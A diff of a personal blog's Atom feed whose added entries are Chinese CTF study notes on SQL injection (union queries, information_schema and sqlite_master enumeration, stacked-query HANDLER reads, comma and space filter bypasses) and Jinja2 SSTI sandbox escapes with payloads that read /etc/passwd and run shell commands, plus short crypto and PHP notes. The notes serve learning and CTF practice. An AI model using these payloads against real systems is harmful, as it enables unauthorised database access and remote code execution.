+    <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;##直接查询&lt;br&gt;
-handler函数使用&lt;br&gt;
-&lt;code&gt;语法&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight</summary>
-        
+&lt;</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
@@ -136,31 +98,27 @@ handler函数使用&lt;br&gt;
   </entry>
   
   <entry>
-    <title>SQL&quot;,&quot;号绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</id>
+    <title>SQL union联合注入</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:04:54.362Z</updated>
+    <updated>2026-02-06T16:58:56.357Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
     
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SQL&amp;quot;,&amp;quot;号绕过&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;join注入：当，被过滤的时候可以使用该方法&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
-        
+    <summary type="html">&lt;h1 id=&quot;SQL-union联合注入&quot;&gt;&lt;a href=&quot;#SQL-union联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL union联合注入&quot;&gt;&lt;/a&gt;SQL union联合注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
+&lt;p&gt;—首先数据</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
-    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
+    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
     
   </entry>
   
@@ -171,24 +129,48 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:00:08.341Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SQLite&lt;/h1&gt;
-&lt;hr&gt;
+    <summary type="html">&lt;h1 id=&quot;SQLite&quot;&gt;&lt;a href=&quot;#SQLite&quot; class=&quot;headerlink&quot; title=&quot;SQLite&quot;&gt;&lt;/a&gt;SQLite&lt;/h1&gt;&lt;hr&gt;
 &lt;p&gt;join注入：当，被过滤的时候可以使用该方法&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
-        
+&lt;figure class=&quot;highlig</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL&quot;,&quot;号绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:04:54.362Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SQL”-”号绕过&quot;&gt;&lt;a href=&quot;#SQL”-”号绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL”,”号绕过&quot;&gt;&lt;/a&gt;SQL”,”号绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;join注入：当，被过滤的时</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -199,19 +181,19 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:00:57.003Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SQL堆叠注入&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）：</summary>
-        
+    <summary type="html">&lt;h1 id=&quot;SQL堆叠注入&quot;&gt;&lt;a href=&quot;#SQL堆叠注入&quot; class=&quot;headerlink&quot; title=&quot;SQL堆叠注入&quot;&gt;&lt;/a&gt;SQL堆叠注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;运用情况：当有过滤select&amp;#x2F;upd</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
@@ -225,23 +207,19 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:05:40.978Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SQL空格绕过&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;##内联绕过&lt;br&gt;
-首先是空格被过滤了可以使用内联绕过具体使用例子如下&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
-        
+&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
@@ -255,22 +233,20 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:01:54.618Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><p>##识别模板引擎##</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure><hr><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SSTI简记&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： ssti&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SSTI简记&quot;&gt;&lt;a href=&quot;#SSTI简记&quot; class=&quot;headerlink&quot; title=&quot;SSTI简记&quot;&gt;&lt;/a&gt;SSTI简记&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： ssti&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;##识别模板引擎##&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
-        
+&lt;figure clas</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SSTI" scheme="https://smileless-l.github.io/tags/SSTI/"/>
@@ -284,53 +260,20 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:47:27.964Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;crypto python函数类&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： crypto&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;求$a^{x} = c &#92;mod m $&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
-        
+    <summary type="html">&lt;h1 id=&quot;crypto-python函数类&quot;&gt;&lt;a href=&quot;#crypto-python函数类&quot; class=&quot;headerlink&quot; title=&quot;crypto python函数类&quot;&gt;&lt;/a&gt;crypto python函数类&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： cryp</summary>
       
     
     
     
-    <category term="Crypto" scheme="https://smileless-l.github.io/categories/crypto/"/>
+    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
     
     
     <category term="python" scheme="https://smileless-l.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>gopher_协议使用</title>
-    <link href="https://smileless-l.github.io/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
-    <id>https://smileless-l.github.io/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T16:53:33.343Z</updated>
-    
-    
-      
-      
-        
-        
-    <summary type="html">&lt;h1&gt;gopher://协议使用&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SSRF&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;|gopher|发送原始 TCP 数据（高级利用）|构造gopher://127.0.0.1:3306/_%23…（向 MySQL 发送恶意 SQL</summary>
-        
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
-    
-    
-    <category term="SSRF" scheme="https://smileless-l.github.io/tags/SSRF/"/>
     
   </entry>
   
@@ -341,24 +284,47 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T16:56:12.049Z</updated>
     
+    <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
     <summary type="html">&lt;p&gt;一些简单php函数简记&lt;/p&gt;
-&lt;p&gt;标签（空格分隔）： PHP&lt;/p&gt;
+&lt;p&gt;标签（空格分隔）： PHP &lt;/p&gt;
 &lt;p&gt;–PHP 函数&lt;/p&gt;
-&lt;h2 id=&quot;php函数简记&quot;&gt;&lt;a class=&quot;header-anchor&quot;</summary>
-        
+&lt;h2 id=&quot;php函数简记&quot;&gt;&lt;a href=&quot;#php函数简记&quot; class=&quot;headerlink&quot; title=&quot;php函数简记&quot;&gt;&lt;/a&gt;php函数简记&lt;/</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>gopher_协议使用</title>
+    <link href="https://smileless-l.github.io/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
+    <id>https://smileless-l.github.io/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T16:53:33.343Z</updated>
+    
